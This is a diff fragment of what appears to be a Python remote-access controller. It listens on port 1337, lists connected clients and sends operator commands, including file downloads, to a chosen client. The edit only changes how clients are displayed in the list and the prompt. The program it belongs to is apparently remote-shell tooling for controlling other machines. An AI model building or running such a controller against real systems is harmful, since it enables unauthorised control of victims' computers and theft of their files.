@@ -16,7 +16,7 @@ socks = []
 server = setup(port=1337)
 while True:
     # display clients
-    refresh(clients)
+    refresh(socks)
     # listen for clients
     try:
         server.settimeout(1)
@@ -32,7 +32,7 @@ while True:
             clients += [str(a)]
     except KeyboardInterrupt:
         # display clients
-        refresh(clients)
+        refresh(socks)
         # accept selection ... int 0/1-128
         activate = input('\nEnter option: ')
         # exit
@@ -84,7 +84,7 @@ while True:
         # prompt
         client.send('get current dir')
         currentDir = client.receive()
-        command = raw_input('\n[[' + clients[activate] + ']' + currentDir + ']:')
+        command = raw_input('\n[[' + socks[activate].getpeername()[0] + ']' + currentDir + ']:')
         # download
         if command.startswith('download'):
             if wrongArgumentNumber(command):
